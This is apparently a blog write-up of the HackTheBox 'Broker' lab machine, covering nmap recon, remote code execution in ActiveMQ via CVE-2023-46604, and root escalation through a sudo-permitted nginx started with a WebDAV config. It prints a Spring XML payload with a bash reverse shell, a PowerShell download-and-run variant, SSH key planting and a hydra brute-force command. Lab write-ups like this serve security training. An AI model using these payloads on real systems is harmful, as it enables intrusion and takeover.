---
render_with_liquid: false
title: HackTheBox Writeup  Broker
date: 2023-11-10 14:04:05 +1400
tags: [hackthebox, nmap, linux, activemq, cve-2023-46604, java, deserialization, cyberchef, sudo, nginx-privesc, nginx, oscp-like-2023, hydra]
---




# Recon
---
```bash
┌──(bravosec㉿fsociety)-[~/htb/Broker]
└─$ pt init '10.129.230.87 broker.htb'
+---------+--------+---------------+------------+
| PROFILE | STATUS |      IP       |   DOMAIN   |
+---------+--------+---------------+------------+
| broker  | on     | 10.129.230.87 | broker.htb |
+---------+--------+---------------+------------+
```

## Nmap

```bash

# Nmap 7.94 scan initiated Fri Nov 10 14:04:05 2023 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80,1883,5672,8161,45213,61613,61614,61616 broker.htb
Nmap scan report for broker.htb (10.129.41.115)
Host is up, received user-set (0.13s latency).
Scanned at 2023-11-10 14:04:05 CST for 43s

PORT      STATE SERVICE    REASON         VERSION
22/tcp    open  ssh        syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp    open  http       syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Error 401 Unauthorized
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
1883/tcp  open  mqtt       syn-ack ttl 63
| mqtt-subscribe:
|   Topics and their most recent payloads:
|     ActiveMQ/Advisory/Consumer/Topic/#:
|_    ActiveMQ/Advisory/MasterBroker:
5672/tcp  open  amqp?      syn-ack ttl 63
|_amqp-info: ERROR: AQMP:handshake expected header (1) frame, but was 65
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie:
|     AMQP
|     AMQP
|     amqp:decode-error
|_    7Connection from client using unsupported AMQP attempted
8161/tcp  open  http       syn-ack ttl 63 Jetty 9.4.39.v20210325
|_http-title: Error 401 Unauthorized
|_http-server-header: Jetty(9.4.39.v20210325)
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
45213/tcp open  tcpwrapped syn-ack ttl 63
61613/tcp open  stomp      syn-ack ttl 63 Apache ActiveMQ
| fingerprint-strings:
|   HELP4STOMP:
|     ERROR
|     content-type:text/plain
|     message:Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolException: Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:258)
|     org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)
|     org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
|     org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)
|     org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)
|_    java.lang.Thread.run(Thread.java:750)
61614/tcp open  http       syn-ack ttl 63 Jetty 9.4.39.v20210325
| http-methods:
|   Supported Methods: GET HEAD TRACE OPTIONS
|_  Potentially risky methods: TRACE
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
|_http-title: Site doesn't have a title.
|_http-server-header: Jetty(9.4.39.v20210325)
61616/tcp open  apachemq   syn-ack ttl 63 ActiveMQ OpenWire transport
| fingerprint-strings:
|   NULL:
|     ActiveMQ
|     TcpNoDelayEnabled
|     SizePrefixDisabled
|     CacheSize
|     ProviderName
|     ActiveMQ
|     StackTraceEnabled
|     PlatformDetails
|     Java
|     CacheEnabled
|     TightEncodingEnabled
|     MaxFrameSize
|     MaxInactivityDuration
|     MaxInactivityDurationInitalDelay
|     ProviderVersion
|_    5.15.15
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5672-TCP:V=7.94%I=7%D=11/10%Time=654DC7E0%P=x86_64-pc-linux-gnu%r(G
...
SF:sing\x20unsupported\x20AMQP\x20attempted");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port61613-TCP:V=7.94%I=7%D=11/10%Time=654DC7DB%P=x86_64-pc-linux-gnu%r(
SF:HELP4STOMP,27F,"ERROR\ncontent-type:text/plain\nmessage:Unknown\x20STOM
SF:P\x20action:\x20HELP\n\norg\.apache\.activemq\.transport\.stomp\.Protoc
SF:olException:\x20Unknown\x20
```

## 80 - HTTP : Jetty web server

### Info

![](/assets/obsidian/278b36b8ba9e38509db7a76b4960a086.png)

# User Flag
---

## Shell as activemq

### ActiveMQ RCE (CVE-2023-46604)


#### Info

The unique service from nmap was **ActiveMQ**

Identified its version : `5.15.15`

![](/assets/obsidian/f3ddedbdd62d5675c82764523123fac4.png)

Google : `activemq 5.15.15 exploit`

> https://www.cvedetails.com/cve/CVE-2023-46604/


![](/assets/obsidian/9cf441e5d9235efd6e909be2f390e0c1.png)

Google : `CVE-2023-46604 poc`

> https://github.com/evkl1d/CVE-2023-46604

```bash
git clone https://github.com/evkl1d/CVE-2023-46604
cd CVE-2023-46604
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Broker/exploit/CVE-2023-46604]
└─$ ls
exploit.py  poc.xml  README.md
```

The exploit utilize unsafe deserialization to create `java.lang.ProcessBuilder()`

![](/assets/obsidian/c21938192f63cd58913191831fc5593c.png)

#### Exploit

> poc.xml

```xml
<?xml version="1.0" encoding="UTF-8" ?>
    <beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
        <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
            <constructor-arg>
            <list>
                <value>bash</value>
                <value>-c</value>
                <value>bash -i &gt;&amp; /dev/tcp/10.10.10.10/9001 0&gt;&amp;1</value>
            </list>
            </constructor-arg>
        </bean>
    </beans>
```

> **Payload for windows**
> 
> ```xml
> <value>cmd</value>
> <value>/c</value>
> <value>powershell Invoke-WebRequest "http://0.0.0.0:8001/test.exe" -OutFile "test.exe"; Start-Process "./test.exe"</value>
> ```
{: .prompt-tip }

The redirectors needs to be entity encoded

> [**Cyberchef Recipe**]([https://gchq.github.io/CyberChef/#recipe=To_HTML_Entity(false,'Named%20entities')]([https://gchq.github.io/CyberChef/#recipe=To_HTML_Entity(false,'Hex%20entities')](https://gchq.github.io/CyberChef/#recipe=To_HTML_Entity(false,'Hex%20entities')))

```bash
bash -i &#x3e;&#x26; &#x2f;dev&#x2f;tcp&#x2f;10&#x2e;10&#x2e;16&#x2e;30&#x2f;1111 0&#x3e;&#x26;1
```

Host the xml payload

> It must be port `80` to work
{: .prompt-tip }

```bash
python -m http.server 80
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Broker/exploit/CVE-2023-46604]
└─$ python exploit.py -i broker.htb -u http://10.10.16.30/poc.xml
     _        _   _           __  __  ___        ____   ____ _____
    / \   ___| |_(_)_   _____|  \/  |/ _ \      |  _ \ / ___| ____|
   / _ \ / __| __| \ \ / / _ \ |\/| | | | |_____| |_) | |   |  _|
  / ___ \ (__| |_| |\ V /  __/ |  | | |_| |_____|  _ <| |___| |___
 /_/   \_\___|\__|_| \_/ \___|_|  |_|\__\_\     |_| \_\\____|_____|

[*] Target: broker.htb:61616
[*] XML URL: http://10.10.16.30/poc.xml

[*] Sending packet: 0000006d1f000000000000000000010100426f72672e737072696e676672616d65776f726b2e636f6e746578742e737570706f72742e436c61737350617468586d6c4170706c69636174696f6e436f6e7465787401001a687474703a2f2f31302e31302e31362e33302f706f632e786d6c
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Broker/exploit/CVE-2023-46604]
└─$ nc -lvnp 1111
listening on [any] 1111 ...

connect to [10.10.16.30] from (UNKNOWN) [10.129.41.115] 38590
bash: cannot set terminal process group (874): Inappropriate ioctl for device
bash: no job control in this shell
activemq@broker:/opt/apache-activemq-5.15.15/bin$
activemq@broker:/opt/apache-activemq-5.15.15/bin$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
activemq@broker:/opt/apache-activemq-5.15.15/bin$ ^Z
zsh: suspended  nc -lvnp 1111

┌──(bravosec㉿fsociety)-[~/htb/Broker/exploit/CVE-2023-46604]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1111

activemq@broker:/opt/apache-activemq-5.15.15/bin$ export TERM=xterm
activemq@broker:/opt/apache-activemq-5.15.15/bin$ id
uid=1000(activemq) gid=1000(activemq) groups=1000(activemq)
activemq@broker:/opt/apache-activemq-5.15.15/bin$ cat ~/user.txt
54a596f0bd7a231d20a569aad5efb2bd
```


# Root Flag
---

## From activemq to root


### Sudo - Nginx


#### Enum

```bash
activemq@broker:/opt/apache-activemq-5.15.15/bin$ sudo -l
Matching Defaults entries for activemq on broker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

```bash
activemq@broker:/opt/apache-activemq-5.15.15/bin$ cat /etc/nginx/nginx.conf
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;

events {
        worker_connections 768;
        # multi_accept on;
}

http {
...
```

#### Setup Webdav config file

Start nginx with the custom config to enable **arbitrary file read and write**  via **webdav**

> `/dev/shm/1.conf`

```bash
user root;
events {
    worker_connections 768;
}
http {
    server {
        listen 7777;
        root /;
        autoindex on;
        dav_methods PUT;
    }
}
```

> - `autoindex` will enable directory listing
> - `dav_methods` will enable webdav
{: .prompt-tip }

```bash
activemq@broker:/opt/apache-activemq-5.15.15/bin$ sudo nginx -c /dev/shm/1.conf
```

#### File read

Now we can read files as root

```bash
┌──(bravosec㉿fsociety)-[~/htb/Broker]
└─$ curl -s broker.htb:7777|head
<html>
<head><title>Index of /</title></head>
<body>
<h1>Index of /</h1><hr><pre><a href="../">../</a>
<a href="bin/">bin/</a>                                               06-Nov-2023 01:10                   -
<a href="boot/">boot/</a>                                              06-Nov-2023 01:38                   -
<a href="dev/">dev/</a>                                               10-Nov-2023 06:00                   -
<a href="etc/">etc/</a>                                               07-Nov-2023 06:53                   -
<a href="home/">home/</a>                                              06-Nov-2023 01:18                   -
<a href="lib/">lib/</a>                                               06-Nov-2023 00:57                   -
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Broker]
└─$ curl -s broker.htb:7777/root/root.txt
f65b0e3bd6b1a2b2fa8dae1ce8b56bbc
```

#### File write

Write SSH keys

```bash
┌──(bravosec㉿fsociety)-[~/htb/Broker]
└─$ curl -s broker.htb:7777/root/.ssh/authorized_keys -T ~/.ssh/id_rsa.pub
```

SSH as root

```bash
┌──(bravosec㉿fsociety)-[~/htb/Broker]
└─$ cssh root@broker.htb
Warning: Permanently added 'broker.htb' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Nov 10 07:15:37 AM UTC 2023

  System load:           0.0
  Usage of /:            71.0% of 4.63GB
  Memory usage:          14%
  Swap usage:            0%
  Processes:             159
  Users logged in:       0
  IPv4 address for eth0: 10.129.41.115
  IPv6 address for eth0: dead:beef::250:56ff:feb9:ea4a

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


root@broker:~# id
uid=0(root) gid=0(root) groups=0(root)
```

# Additional
---

## ActiveMQ - Default credentials

```bash
hydra -e nsr -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/darkweb2017-top100.txt broker.htb http-get / -t 64
```

![](/assets/obsidian/a2a30ce075defd7db842e291990a1f92.png)

Successfully login with `admin:admin`

![](/assets/obsidian/b60b58827472fc6eee1b7d0a7e8b23e3.png)

Version revealed in admin panel

> http://broker.htb/admin/

![](/assets/obsidian/b2c8a7ce0532998f70d58cccb6db7bf7.png)